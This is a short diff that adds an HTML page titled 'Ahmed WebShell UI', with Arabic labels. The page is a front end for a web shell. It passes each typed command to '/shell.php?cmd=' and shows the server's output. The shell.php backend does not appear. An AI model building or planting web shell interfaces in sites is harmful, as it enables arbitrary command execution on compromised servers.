@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ahmed WebShell UI</title>
+  <style>
+    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    input[type="text"] { width: 400px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
+    input[type="submit"] { background: #0f0; color: #000; border: none; padding: 5px 10px; }
+    pre { background: #222; padding: 10px; border-radius: 5px; }
+  </style>
+</head>
+<body>
+  <h2>💻 Ahmed Web Shell UI (واجهة فقط)</h2>
+  <form onsubmit="sendCommand(); return false;">
+    <input type="text" id="cmd" placeholder="اكتب الأمر هنا">
+    <input type="submit" value="تنفيذ">
+  </form>
+  <pre id="output">في انتظار التنفيذ...</pre>
+
+  <script>
+    async function sendCommand() {
+      const cmd = document.getElementById('cmd').value;
+      const res = await fetch('/shell.php?cmd=' + encodeURIComponent(cmd));
+      const text = await res.text();
+      document.getElementById('output').innerText = text;
+    }
+  </script>
+</body>
+</html>
